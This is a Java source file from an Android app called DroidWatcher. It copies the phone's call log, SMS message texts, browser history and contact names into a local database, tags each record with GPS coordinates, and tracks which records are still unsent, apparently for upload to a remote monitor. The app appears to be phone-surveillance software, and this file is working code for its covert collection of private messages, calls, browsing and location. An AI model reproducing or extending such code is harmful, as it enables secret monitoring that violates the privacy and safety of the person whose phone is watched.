package com.droidwatcher;

import java.util.ArrayList;
import java.util.Date;

import org.acra.ACRA;

import com.droidwatcher.lib.BrowserHistory;
import com.droidwatcher.lib.Call;
import com.droidwatcher.lib.GPS;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.lib.SMS;
import com.droidwatcher.modules.FilterModule;
import com.droidwatcher.modules.location.LocationModule;
import com.droidwatcher.variables.DBResult;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.location.Location;
import android.net.Uri;
import android.provider.Browser;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract.PhoneLookup;

public class DBManager extends SQLiteOpenHelper {
	private Context mContext;
	
	private final static int DB_VER = 331;
	private final static String DB_NAME = "DWDB";
    
    public static final Uri CALL_URI = Calls.CONTENT_URI;
    public static final Uri SMS_URI = Uri.parse("content://sms");
    public static final Uri BROWSER_URI = Browser.BOOKMARKS_URI;
    
    private static final String TABLE_NAME_CALL = "DW_CALL";
    private static final String TABLE_NAME_SMS = "DW_SMS";
    private static final String TABLE_NAME_GPS = "DW_GPS";
    private static final String TABLE_NAME_BROWSER = "DW_BROWSER";
    
    private static final String DROP_TABLE_CALL = "DROP TABLE IF EXISTS " + TABLE_NAME_SMS;
    private static final String DROP_TABLE_SMS = "DROP TABLE IF EXISTS " + TABLE_NAME_CALL;
    private static final String DROP_TABLE_GPS = "DROP TABLE IF EXISTS " + TABLE_NAME_GPS;
    private static final String DROP_TABLE_BROWSER = "DROP TABLE IF EXISTS " + TABLE_NAME_BROWSER;
    
    /** Type: INTEGER (Long)*/
    private static final String ID_COLUMN = "_id";
    /** Type: TEXT (String)*/
    private static final String NUMBER_COLUMN = "number";
    /** Type: INTEGER (Long)*/
    private static final String DATE_COLUMN = "date";
    /** Type: TEXT (String)*/
    private static final String NAME_COLUMN = "name";
    /** Type: INTEGER (int) <br>1 - IN<br>2 - MISSED<br>3 - OUT*/
    private static final String TYPE_COLUMN = "type";
    /** Type: TEXT (String)*/
    private static final String TEXT_COLUMN = "text";
    /** Type: INTEGER (Long)*/
    private static final String DURATION_COLUMN = "duration";
    /** Type: INTEGER (int)*/
    private static final String SENT_COLUMN = "sent";
    /** Type: INTEGER (int)*/
    private static final String SMS_SENT_COLUMN = "sms_sent";
    
    /** Type: REAL (double)*/
    private static final String ACC_COLUMN = "acc";
    /** Type: REAL (double)*/
    private static final String ALT_COLUMN = "alt";
    /** Type: REAL (double)*/
    private static final String LAT_COLUMN = "lat";
    /** Type: REAL (double)*/
    private static final String LON_COLUMN = "lon";
    /** Type: REAL (double)*/
    private static final String BATTERY_COLUMN = "battery";
    /** Type: TEXT (String)*/
    private static final String PROVIDER_COLUMN = "provider";
    
    /** Type: TEXT (String)*/
    private static final String URL_COLUMN = "url";
    /** Type: TEXT (String)*/
    private static final String TITLE_COLUMN = "title";
    
    private static final String CREATE_TABLE_SMS = "CREATE TABLE " + TABLE_NAME_SMS + "( _id INTEGER PRIMARY KEY , "
    								+NUMBER_COLUMN+" TEXT, "
    								+NAME_COLUMN+" TEXT, "
    								+DATE_COLUMN+" INTEGER, "
    								+TYPE_COLUMN+" INTEGER, "
    								+TEXT_COLUMN+" TEXT, "
    								+SMS_SENT_COLUMN+" INTEGER, "
    								+LAT_COLUMN+" REAL, "
									+LON_COLUMN+" REAL, "
    								+SENT_COLUMN+" INTEGER)";
    
    private static final String CREATE_TABLE_CALL = "CREATE TABLE " + TABLE_NAME_CALL + "( _id INTEGER PRIMARY KEY , "
									+NUMBER_COLUMN+" TEXT, "
									+NAME_COLUMN+" TEXT, "
									+DATE_COLUMN+" INTEGER, "
									+TYPE_COLUMN+" INTEGER, "
									+DURATION_COLUMN+" INTEGER, "
									+SMS_SENT_COLUMN+" INTEGER, "
									+LAT_COLUMN+" REAL, "
									+LON_COLUMN+" REAL, "
									+SENT_COLUMN+" INTEGER)";
    
    private static final String CREATE_TABLE_GPS = "CREATE TABLE " + TABLE_NAME_GPS + "( _id INTEGER PRIMARY KEY , "
									+ACC_COLUMN+" REAL, "
									+ALT_COLUMN+" REAL, "
									+LAT_COLUMN+" REAL, "
									+LON_COLUMN+" REAL, "
									+DATE_COLUMN+" INTEGER, "
									+BATTERY_COLUMN+" INTEGER, "
									+PROVIDER_COLUMN+" TEXT, "
									+SENT_COLUMN+" INTEGER)";
    
    private static final String CREATE_TABLE_BROWSER = "CREATE TABLE " + TABLE_NAME_BROWSER + "( _id INTEGER PRIMARY KEY , "
									+DATE_COLUMN+" INTEGER, "
									+URL_COLUMN+" TEXT, "
									+TITLE_COLUMN+" TEXT, "
									+LAT_COLUMN+" REAL, "
									+LON_COLUMN+" REAL, "
    								+SENT_COLUMN+" INTEGER)";
    
    private static final String[] PROJECTION_CALL = new String[] { Calls.NUMBER, Calls.DATE, Calls.DURATION, Calls.TYPE, Calls.CACHED_NAME };
    private static final String[] PROJECTION_SMS = new String[] { "address", "date", "type", "body" };
    private static final String[] PROJECTION_BROWSER = new String[] { Browser.BookmarkColumns.DATE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.TITLE };

    public DBManager(Context context) {
		super(context, DB_NAME, null, DB_VER);
		this.mContext = context;
	}
    
    @Override
    public SQLiteDatabase getReadableDatabase() {
    	Debug.i("[DBManager] getReadableDatabase;");
    	
    	return super.getReadableDatabase();
    }

	@Override
	public void onCreate(SQLiteDatabase db) {
		Debug.i("[DBManager] onCreate;");
		
		db.execSQL(CREATE_TABLE_SMS);
		db.execSQL(CREATE_TABLE_CALL);
		db.execSQL(CREATE_TABLE_GPS);
		db.execSQL(CREATE_TABLE_BROWSER);
		
		fillDB(db);
	}

	@Override
	public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
		Debug.i("[DBManager] onUpgrade; oldVersion: " + oldVersion + "; newVersion: " + newVersion); 
		
		if (oldVersion < 320) { //lat, lon in sms/call
			db.execSQL(DROP_TABLE_CALL);
			db.execSQL(DROP_TABLE_SMS);
			
			db.execSQL(CREATE_TABLE_SMS);
			db.execSQL(CREATE_TABLE_CALL);
			
			fillDB(db);
		}
		
		if (oldVersion < 321) { // gps PROVIDER_COLUMN error
			db.execSQL(DROP_TABLE_GPS);
			db.execSQL(CREATE_TABLE_GPS);
		}
		
		if (oldVersion < 331) { // BROWSER
			db.execSQL(DROP_TABLE_BROWSER);
			db.execSQL(CREATE_TABLE_BROWSER);
			resetBrowserHistory(db);
		}
	}
	
	private static final int DAY = 24 * 60 * 60 * 1000;
	private static final long MONTH = 30 * 24 * 60 * 60 * 1000L;
	
	private static synchronized long getDayOffset(){
		return new Date().getTime() - DAY;
	}
	private static synchronized long getMonthOffset(){
		return new Date().getTime() - MONTH;
	}
	
	private void fillDB(SQLiteDatabase db){
		long offset = getDayOffset();
		
		Cursor cursor = mContext.getContentResolver().query(CALL_URI, PROJECTION_CALL, Calls.DATE + " > " + offset, null, null);
		try {
			if (cursor != null){
				copyCallToDWDB(db, cursor, true);
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
		finally{
			if (cursor != null) {
				cursor.close();
			}
		}

		cursor = mContext.getContentResolver().query(SMS_URI, PROJECTION_SMS, "(type=1 OR type=2) AND date > " + offset, null, null);
		try {
			if (cursor != null){
				copySMSToDWDB(db, cursor, true);
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
		finally{
			if (cursor != null) {
				cursor.close();
			}
		}
		
		resetBrowserHistory(db);
	}
	
	private void copyCallToDWDB(SQLiteDatabase db, Cursor cursor, Boolean sent){
		ContentValues values;
		int _NUMBER = 0;
        int _DATE =  1;
        int _DURATION =  2;
        int _CALLTYPE =  3;
        int _NAME =  4;
        String number;
        boolean filtered;
        long date;
        long timeout = new Date().getTime() - LocationModule.LOCATION_TIMEOUT;
        
		while(cursor.moveToNext()){
			number = cursor.getString(_NUMBER);
			date = cursor.getLong(_DATE);
			filtered = !sent && FilterModule.isNumberFiltered(mContext, number);
					
	        
	        values = new ContentValues();
	        values.put(NUMBER_COLUMN, number);
	        values.put(DATE_COLUMN, date);
	        values.put(DURATION_COLUMN, cursor.getLong(_DURATION));
	        String name = null;
	        try{
	        	name = cursor.getString(_NAME);
	        	if (name == null){
	        		name = "Unknown";
	        	}
	        }
	        catch(Exception e){
	        	name = "Unknown";
	        }
	        values.put(NAME_COLUMN, name);
	        values.put(TYPE_COLUMN, cursor.getInt(_CALLTYPE));
	        values.put(SENT_COLUMN, (sent || filtered ? 1 : 0));
	        values.put(SMS_SENT_COLUMN, (sent || filtered ? 1 : 0));
	        
	        Location location = null;
	        if (!sent && !filtered && date >= timeout) {
				location = LocationModule.getLocation(mContext);
			}
	        
	        values.put(LAT_COLUMN, (location == null ? 0 : location.getLatitude()));
	        values.put(LON_COLUMN, (location == null ? 0 : location.getLongitude()));
	        
	        db.insert(TABLE_NAME_CALL, null, values);
		}
	}
	
	private void copySMSToDWDB(SQLiteDatabase db, Cursor cursor, Boolean sent){
		ContentValues values;
		int _NUMBER = 0;
        int _DATE =  1;
        int _TYPE =  2;
        int _BODY = 3;
        String number;
        boolean filtered;
        long date;
        long timeout = new Date().getTime() - LocationModule.LOCATION_TIMEOUT;
        
		while(cursor.moveToNext()){
			number = cursor.getString(_NUMBER);
			date = cursor.getLong(_DATE);
			filtered = !sent && FilterModule.isNumberFiltered(mContext, number);
			
	        
	        values = new ContentValues();
	        values.put(NUMBER_COLUMN, number);
	        values.put(DATE_COLUMN, date);
	        values.put(TEXT_COLUMN, cursor.getString(_BODY));
	        values.put(NAME_COLUMN, (sent ? "" : getContactName(number)));
	        values.put(TYPE_COLUMN, cursor.getInt(_TYPE));
	        values.put(SENT_COLUMN, (sent || filtered ? 1 : 0));
	        values.put(SMS_SENT_COLUMN, (sent || filtered ? 1 : 0));
	        
	        Location location = null;
	        if (!sent && !filtered && date >= timeout) {
				location = LocationModule.getLocation(mContext);
			}
	        
	        values.put(LAT_COLUMN, (location == null ? 0 : location.getLatitude()));
	        values.put(LON_COLUMN, (location == null ? 0 : location.getLongitude()));
	        
	        db.insert(TABLE_NAME_SMS, null, values);
		}
	}
	
	private void copyBrowserToDWDB(SQLiteDatabase db, Cursor cursor, Boolean sent){
		ContentValues values;
		int _DATE = 0;
        int _URL =  1;
        int _TITLE =  2;
        long date;
        long timeout = new Date().getTime() - LocationModule.LOCATION_TIMEOUT;
        
		while(cursor.moveToNext()){
			date = cursor.getLong(_DATE);
			
	        values = new ContentValues();
	        values.put(DATE_COLUMN, date);
	        values.put(URL_COLUMN, cursor.getString(_URL));
	        values.put(TITLE_COLUMN, cursor.getString(_TITLE));
	        values.put(SENT_COLUMN, sent);
	        
	        Location location = null;
	        if (!sent && date >= timeout) {
				location = LocationModule.getLocation(mContext);
			}
	        
	        values.put(LAT_COLUMN, (location == null ? 0 : location.getLatitude()));
	        values.put(LON_COLUMN, (location == null ? 0 : location.getLongitude()));
	        
	        db.insert(TABLE_NAME_BROWSER, null, values);
		}
	}
	
	public void resetBrowserHistory(){
		SQLiteDatabase db = null;
		try {
			db = getWritableDatabase();
			resetBrowserHistory(db);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleException(e);
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
				db = null;
			}
		}
	}
	
	public void resetBrowserHistory(SQLiteDatabase db) {
		Cursor cursor = null;
		try {
			long lastDate = getLastDate(db, TABLE_NAME_BROWSER);
			cursor = mContext.getContentResolver().query(BROWSER_URI, PROJECTION_BROWSER,
					Browser.BookmarkColumns.DATE + " > " + lastDate + " AND " + Browser.BookmarkColumns.DATE + " > " + getDayOffset(), null, null);
			
			if (cursor != null && cursor.getCount() != 0) {
				copyBrowserToDWDB(db, cursor, true);
			}

		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleException(e);

		} finally {
			if (cursor != null && !cursor.isClosed()) {
				cursor.close();
				cursor = null;
			}
		}
	}
	
	private String getContactName(String num){
		String name = "Unknown";
		Cursor cursor = null;
		try {
			Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(num));
			cursor = mContext.getContentResolver().query(uri, new String[] {PhoneLookup.DISPLAY_NAME}, null, null, null);
			
			if (cursor == null) {
				return name;
			}
			
			if (cursor.moveToFirst()){
				name = cursor.getString(cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME));
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
		finally{
			if (cursor != null){
				cursor.close();
			}
		}
		
		return name;
	}
	
	private long getLastDate(SQLiteDatabase db, String table){
		Cursor cursor = null;
		try {
			cursor = db.rawQuery("SELECT MAX(" + DATE_COLUMN + ") FROM " + table, null);
			if (cursor.moveToFirst()) {
				return cursor.getLong(0);
			}
			else{
				return 0;
			}
		} finally{
			if (cursor != null) {
				cursor.close();
			}
		}
		
	}
	
	public synchronized void deleteOdlRecords(){
		SQLiteDatabase db = null;
		try {
			db = getWritableDatabase();
			long date = getMonthOffset();
			
			Debug.i("[DBManager] deleteOdlRecords; " + DATE_COLUMN + " < " + date + " AND " + SENT_COLUMN + " = 1");
			
			int countCall = db.delete(TABLE_NAME_CALL, DATE_COLUMN + " < " + date + " AND " + SENT_COLUMN + " = 1" , null);
			int countSms = db.delete(TABLE_NAME_SMS, DATE_COLUMN + " < " + date + " AND " + SENT_COLUMN + " = 1", null);
			int countBrowser = db.delete(TABLE_NAME_BROWSER, DATE_COLUMN + " < " + date + " AND " + SENT_COLUMN + " = 1", null);
			
			Debug.i("[DBManager] deleteOdlRecords; countCall: " + countCall + " countSms: " + countSms + " countBrowser: " + countBrowser);
			
		} catch (Exception e) {
			Debug.exception(e);
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
		}
	}
	
	/**
	 * Compare calls in Android DB and DWDB
	 * @return Are there any new records
	 */
	public synchronized Boolean compareCall(){
		SQLiteDatabase db = getWritableDatabase();
		long lastDate = getLastDate(db, TABLE_NAME_CALL);
		Cursor cursor = mContext.getContentResolver().query(CALL_URI, PROJECTION_CALL, Calls.DATE + " > " + lastDate + " AND " + Calls.DATE + " > " + getDayOffset(), null, null);
		if (cursor == null || cursor.getCount() == 0) {
			return false;
		}
		else{
			copyCallToDWDB(db, cursor, false);
			cursor.close();
			db.close();
		}
		
		return true;
	}
	
	/**
	 * Compare sms in Android DB and DWDB
	 * @return Are there any new records
	 */
	public synchronized Boolean compareSMS(){
		SQLiteDatabase db = getWritableDatabase();
		long lastDate = getLastDate(db, TABLE_NAME_SMS);
		Cursor cursor = mContext.getContentResolver().query(SMS_URI, PROJECTION_SMS, "(type = 1 OR type = 2) AND date > " + lastDate + " AND date > " + getDayOffset(), null, null);
		if (cursor == null || cursor.getCount() == 0) {
			return false;
		}
		else{
			copySMSToDWDB(db, cursor, false);
			cursor.close();
			db.close();
		}
		
		return true;
	}
	
	public synchronized Boolean compareBrowserHistory(){
		SQLiteDatabase db = getWritableDatabase();
		long lastDate = getLastDate(db, TABLE_NAME_BROWSER);
		Cursor cursor = mContext.getContentResolver().query(BROWSER_URI, PROJECTION_BROWSER, "date > " + lastDate + " AND date > " + getDayOffset(), null, null);
		if (cursor == null || cursor.getCount() == 0) {
			return false;
		}
		else{
			copyBrowserToDWDB(db, cursor, false);
			cursor.close();
			db.close();
		}
		
		return true;
	}
	
	public synchronized void addGPS(GPS gps){
		SQLiteDatabase db = getWritableDatabase();
		ContentValues values = new ContentValues();
		values.put(ACC_COLUMN, gps.acc);
		values.put(ALT_COLUMN, gps.alt);
		values.put(LAT_COLUMN, gps.lat);
		values.put(LON_COLUMN, gps.lon);
		values.put(DATE_COLUMN, gps.date);
		values.put(BATTERY_COLUMN, gps.battery);
		values.put(PROVIDER_COLUMN, gps.provider);
		values.put(SENT_COLUMN, 0);
		
		db.insert(TABLE_NAME_GPS, null, values);
		db.close();
	}
	
	public synchronized DBResult getGPS(){
		DBResult result = null;
		SQLiteDatabase db = this.getReadableDatabase();
		Cursor cursor = db.query(TABLE_NAME_GPS, null, SENT_COLUMN + " = 0", null, null, null, null);
		try {
			if (cursor != null && cursor.getCount() > 0){
				result = new DBResult(cursor.getCount());
				int _ID,  _DATE, _ACC, _ALT, _LAT, _LON, _BATTERY, _PROVIDER;
				while(cursor.moveToNext()){
					_ID = cursor.getColumnIndex(ID_COLUMN);
			        _DATE =  cursor.getColumnIndex(DATE_COLUMN);
			        _ACC =  cursor.getColumnIndex(ACC_COLUMN);
			        _ALT =  cursor.getColumnIndex(ALT_COLUMN);
			        _LAT =  cursor.getColumnIndex(LAT_COLUMN);
			        _LON =  cursor.getColumnIndex(LON_COLUMN);
			        _BATTERY =  cursor.getColumnIndex(BATTERY_COLUMN);
			        _PROVIDER =  cursor.getColumnIndex(PROVIDER_COLUMN);
			        
			        result.add(cursor.getLong(_ID),
			        	new GPS(
				        	cursor.getDouble(_ACC),
		        			cursor.getDouble(_ALT),
		        			cursor.getDouble(_LAT),
		        			cursor.getDouble(_LON),
		        			cursor.getLong(_DATE),
		        			cursor.getInt(_BATTERY),
		        			cursor.getString(_PROVIDER))
	        		);
				}
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
		finally{
			if (cursor != null) {
				cursor.close();
			}
		}
		
		db.close();
		
		return result;
	}
	
	public DBResult getCalls(){
		return getCalls(false);
	}
	
	public DBResult getCalls(Boolean bySmsSentStatus){
		return getCalls(bySmsSentStatus ? SMS_SENT_COLUMN : SENT_COLUMN);
	}

	private synchronized DBResult getCalls(String sentColumn){
		DBResult result = null;
		SQLiteDatabase db = this.getReadableDatabase();
		Cursor cursor = db.query(TABLE_NAME_CALL, null, sentColumn + " = 0", null, null, null, null);
		try {
			if (cursor != null && cursor.getCount() > 0){
				result = new DBResult(cursor.getCount());
				int _ID, _NUMBER, _DATE, _DURATION, _TYPE, _NAME, _LAT, _LON;
				while(cursor.moveToNext()){
					_ID = cursor.getColumnIndex(ID_COLUMN);
					_NUMBER = cursor.getColumnIndex(NUMBER_COLUMN);
			        _DATE =  cursor.getColumnIndex(DATE_COLUMN);
			        _DURATION =  cursor.getColumnIndex(DURATION_COLUMN);
			        _TYPE =  cursor.getColumnIndex(TYPE_COLUMN);
			        _NAME =  cursor.getColumnIndex(NAME_COLUMN);
			        _LAT =  cursor.getColumnIndex(LAT_COLUMN);
			        _LON =  cursor.getColumnIndex(LON_COLUMN);
			        
			        result.add(
			        	cursor.getLong(_ID), 
			        	new Call(
			        		cursor.getString(_NUMBER),
			        		cursor.getLong(_DATE),
			        		cursor.getLong(_DURATION),
			        		cursor.getInt(_TYPE),
			        		cursor.getString(_NAME),
			        		cursor.getDouble(_LAT),
		        			cursor.getDouble(_LON)
		        		)
			        );
				}
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
		finally{
			if (cursor != null) {
				cursor.close();
			}
			db.close();
		}
		
		return result;
	}
	
	public DBResult getSMS(){
		return getSMS(false);
	}
	
	public DBResult getSMS(Boolean bySmsSentStatus){
		return getSMS(bySmsSentStatus ? SMS_SENT_COLUMN : SENT_COLUMN);
	}
	
	private synchronized DBResult getSMS(String sentColumn){
		DBResult result = null;
		SQLiteDatabase db = getReadableDatabase();
		Cursor cursor = db.query(TABLE_NAME_SMS, null, sentColumn + " = 0", null, null, null, null);
		try {
			if (cursor != null && cursor.getCount() > 0){
				result = new DBResult(cursor.getCount());
				int _ID, _NUMBER, _DATE, _BODY, _TYPE, _NAME, _LAT, _LON;
				while(cursor.moveToNext()){
					_ID = cursor.getColumnIndex(ID_COLUMN);
					_NUMBER = cursor.getColumnIndex(NUMBER_COLUMN);
			        _DATE =  cursor.getColumnIndex(DATE_COLUMN);
			        _TYPE =  cursor.getColumnIndex(TYPE_COLUMN);
			        _BODY = cursor.getColumnIndex(TEXT_COLUMN);
			        _NAME = cursor.getColumnIndex(NAME_COLUMN);
			        _LAT =  cursor.getColumnIndex(LAT_COLUMN);
			        _LON =  cursor.getColumnIndex(LON_COLUMN);
			        
			        result.add(
			        	cursor.getLong(_ID),
			        	new SMS(
			        		cursor.getString(_BODY),
			        		cursor.getLong(_DATE),
			        		cursor.getString(_NAME),
			        		cursor.getString(_NUMBER),
			        		cursor.getInt(_TYPE),
			        		cursor.getDouble(_LAT),
		        			cursor.getDouble(_LON)
			        	)
			        );
				}
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
		finally{
			if (cursor != null) {
				cursor.close();
			}
			db.close();
		}
		
		return result;
	}
	
	public synchronized DBResult getBrowserHistory(){
		DBResult result = null;
		SQLiteDatabase db = getReadableDatabase();
		Cursor cursor = db.query(TABLE_NAME_BROWSER, null, SENT_COLUMN + " = 0", null, null, null, null);
		try {
			if (cursor != null && cursor.getCount() > 0){
				result = new DBResult(cursor.getCount());
				int _ID, _DATE, _URL, _TITLE, _LAT, _LON;
				while(cursor.moveToNext()){
					_ID = cursor.getColumnIndex(ID_COLUMN);;
			        _DATE =  cursor.getColumnIndex(DATE_COLUMN);
			        _URL =  cursor.getColumnIndex(URL_COLUMN);
			        _TITLE = cursor.getColumnIndex(TITLE_COLUMN);
			        _LAT =  cursor.getColumnIndex(LAT_COLUMN);
			        _LON =  cursor.getColumnIndex(LON_COLUMN);
			        
			        result.add(
			        	cursor.getLong(_ID),
			        	new BrowserHistory(
		        			cursor.getLong(_DATE),
			        		cursor.getString(_URL),
			        		cursor.getString(_TITLE),
			        		cursor.getDouble(_LAT),
		        			cursor.getDouble(_LON)
			        	)
			        );
				}
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
		finally{
			if (cursor != null) {
				cursor.close();
			}
			db.close();
		}
		
		return result;
	}
	
	public synchronized void updateSentStatus(MessageType type, ArrayList<Long> id){
		ContentValues values = new ContentValues(1);
		values.put(SENT_COLUMN, 1);
		
		String table;
		switch (type) {
		case CALL:
			table = TABLE_NAME_CALL;
			break;
		case SMS:
			table = TABLE_NAME_SMS;
			break;
		case GPS:
			table = TABLE_NAME_GPS;
			break;
		case BROWSER:
			table = TABLE_NAME_BROWSER;
			break;
		default:
			return;
		}
		
		SQLiteDatabase db = getWritableDatabase();
		
		int size = id.size();
		for (int i = 0; i < size; i++){
			db.update(table, values, ID_COLUMN + "=" + id.get(i), null);
		}
		db.close();
	}
	
	public synchronized void updateSmsSentStatus(MessageType type, ArrayList<Long> id){
		if (id.size() == 0) {
			return;
		}
		
		ContentValues values = new ContentValues(1);
		values.put(SMS_SENT_COLUMN, 1);
		
		String table;
		switch (type) {
		case CALL:
			table = TABLE_NAME_CALL;
			break;
		case SMS:
			table = TABLE_NAME_SMS;
			break;
		default:
			return;
		}
		
		SQLiteDatabase db = getWritableDatabase();
		
		int size = id.size();
		for (int i = 0; i < size; i++){
			db.update(table, values, ID_COLUMN + "=" + id.get(i), null);
		}
		db.close();
	}
	
}
